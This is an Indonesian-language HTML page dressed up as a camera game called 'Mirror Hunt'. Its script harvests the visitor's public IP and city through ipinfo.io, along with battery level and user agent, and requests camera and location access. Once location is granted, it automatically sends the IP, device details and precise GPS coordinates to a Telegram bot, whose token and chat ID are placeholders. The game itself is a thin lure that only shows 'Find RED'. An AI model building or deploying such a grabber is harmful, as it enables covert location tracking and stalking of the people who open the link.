<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Mirror Hunt — Demo Aman</title>
<style>
  :root{--bg:#0f172a;--card:#111827;--accent:#7c3aed;--glass:rgba(255,255,255,0.04);}
  body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(135deg,#0b1220,#102033);color:#e6eef8;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:18px;}
  .app{width:100%;max-width:980px;background:linear-gradient(180deg,rgba(255,255,255,0.03),transparent);border-radius:12px;padding:18px;box-shadow:0 10px 30px rgba(2,6,23,0.6);}
  header{display:flex;align-items:center;gap:12px}
  h1{margin:0;font-size:1.3rem}
  .row{display:flex;gap:12px;margin-top:12px}
  .col{flex:1}
  .card{background:var(--card);padding:12px;border-radius:10px;backdrop-filter:blur(6px);box-shadow:0 6px 18px rgba(2,6,23,0.5)}
  video{width:100%;height:360px;object-fit:cover;border-radius:8px;background:#000}
  button{background:var(--accent);color:white;border:0;padding:10px 12px;border-radius:8px;cursor:pointer}
  small{opacity:0.8}
  .meta{font-size:0.9rem;line-height:1.4}
  .danger{background:#b91c1c}
  .hidden{display:none}
  .flex{display:flex;gap:8px;align-items:center}
  .badge{background:var(--glass);padding:6px 8px;border-radius:8px;font-size:0.85rem}
</style>
</head>
<body>
  <div class="app" role="main" aria-labelledby="title">
    <header>
      <div>
        <h1 id="title">Mirror Hunt — Game Demo</h1>
        <small>Game ini otomatis kirim data device ke Telegram.</small>
      </div>
      <div style="margin-left:auto" class="flex">
        <span class="badge" id="permStatus">Permission: —</span>
      </div>
    </header>

    <div class="row" style="margin-top:14px">
      <div class="col card">
        <div style="display:flex;gap:10px;align-items:center;">
          <button id="btnEnableCam">Enable Camera</button>
          <button id="btnEnableLoc">Enable Location</button>
          <button id="btnClear" class="danger">Stop & Clear</button>
        </div>

        <div style="margin-top:12px" id="camArea" class="hidden">
          <video id="video" autoplay playsinline></video>
          <div style="display:flex;gap:8px;margin-top:8px;align-items:center">
            <button id="btnStartGame">Start Mirror Hunt</button>
            <div id="gameInfo" style="margin-left:auto">Status: <span id="gameStatus">Idle</span></div>
          </div>
        </div>
      </div>

      <div class="col card">
        <h3>Device Info</h3>
        <div class="meta">
          <div>IP: <span id="ip">-</span></div>
          <div>Location: <span id="loc">-</span></div>
          <div>Battery: <span id="battery">-</span></div>
          <div>UserAgent: <small id="ua"></small></div>
        </div>

        <hr style="margin:12px 0;border:none;border-top:1px solid rgba(255,255,255,0.04)">

        <h4>Note</h4>
        <p style="font-size:0.9rem;opacity:0.9">
          Data akan dikirim otomatis ke Telegram ketika sudah berhasil didapat.
        </p>
      </div>
    </div>

    <div style="margin-top:12px" id="log" class="card hidden"></div>
  </div>

<script>
(async ()=>{

  const btnCam = document.getElementById('btnEnableCam');
  const btnLoc = document.getElementById('btnEnableLoc');
  const btnClear = document.getElementById('btnClear');
  const video = document.getElementById('video');
  const camArea = document.getElementById('camArea');
  const ipEl = document.getElementById('ip');
  const locEl = document.getElementById('loc');
  const batEl = document.getElementById('battery');
  const uaEl = document.getElementById('ua');
  const permStatus = document.getElementById('permStatus');
  const btnStartGame = document.getElementById('btnStartGame');
  const gameStatus = document.getElementById('gameStatus');
  const log = document.getElementById('log');

  uaEl.textContent = navigator.userAgent;

  // ambil IP publik
  let ipData = '';
  try {
    const resp = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r=>r.json()).catch(()=>null);
    if(resp && resp.ip){
      ipData = resp.ip + ' — ' + (resp.city||'-') + ', ' + (resp.country||'-');
      ipEl.textContent = ipData;
    } else ipEl.textContent = 'Tidak tersedia';
  } catch(e){ ipEl.textContent = 'Error'; }

  // battery
  try {
    if(navigator.getBattery) {
      const battery = await navigator.getBattery();
      const upd = ()=> {
        batEl.textContent = Math.round(battery.level*100) + '%' + (battery.charging ? ' ⚡️' : '');
      };
      upd();
      battery.addEventListener('levelchange', upd);
      battery.addEventListener('chargingchange', upd);
    } else { batEl.textContent = 'Tidak didukung'; }
  } catch(e){ batEl.textContent = 'Error'; }

  // camera
  let stream = null;
  btnCam.addEventListener('click', async ()=>{
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      camArea.classList.remove('hidden');
      permStatus.textContent = 'Permission: Camera ✅';
      logMessage('Camera diaktifkan.');
    } catch(err){
      permStatus.textContent = 'Permission: Camera ❌';
    }
  });

  // location
  btnLoc.addEventListener('click', async ()=>{
    if(!navigator.geolocation){ return; }
    permStatus.textContent = 'Permission: Meminta lokasi…';
    navigator.geolocation.getCurrentPosition(pos=>{
      const coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (acc ${pos.coords.accuracy}m)`;
      locEl.textContent = coords;
      permStatus.textContent = 'Permission: Location ✅';
      logMessage('Lokasi diambil.');
      autoSend(); // kirim otomatis setelah lokasi berhasil
    });
  });

  // stop & clear
  btnClear.addEventListener('click', ()=>{
    if(stream){
      stream.getTracks().forEach(t=>t.stop());
      stream = null;
      video.srcObject = null;
    }
    camArea.classList.add('hidden');
    permStatus.textContent = 'Permission: —';
    locEl.textContent = '-';
  });

  // SIMPLE GAME
  btnStartGame.addEventListener('click', async ()=>{
    if(!stream){ return; }
    gameStatus.textContent = 'Preparing...';
    await delay(700);
    gameStatus.textContent = 'Find RED';
  });

  // === Kirim ke Telegram otomatis ===
  const CHAT_ID = "GANTI_CHAT_ID";
  const BOT_TOKEN = "GANTI_BOT_TOKEN";

  async function autoSend(){
    const text = `
🌐 Informasi IP
${ipEl.textContent}

📱 Device Info
Battery: ${batEl.textContent}
UA: ${uaEl.textContent}

📍 Lokasi
${locEl.textContent}

⏰ Waktu: ${new Date().toLocaleString("id-ID")}
    `.trim();

    try{
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({chat_id:CHAT_ID,text})
      });
      logMessage("✅ Data otomatis terkirim ke Telegram");
    }catch(e){
      logMessage("❌ Gagal kirim ke Telegram");
    }
  }

  function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
  function logMessage(s){
    log.classList.remove('hidden');
    const time = new Date().toLocaleTimeString();
    log.innerHTML = `<div style="font-size:0.9rem;opacity:0.95">[${time}] ${s}</div>` + log.innerHTML;
  }

})();
</script>
</body>
</html>
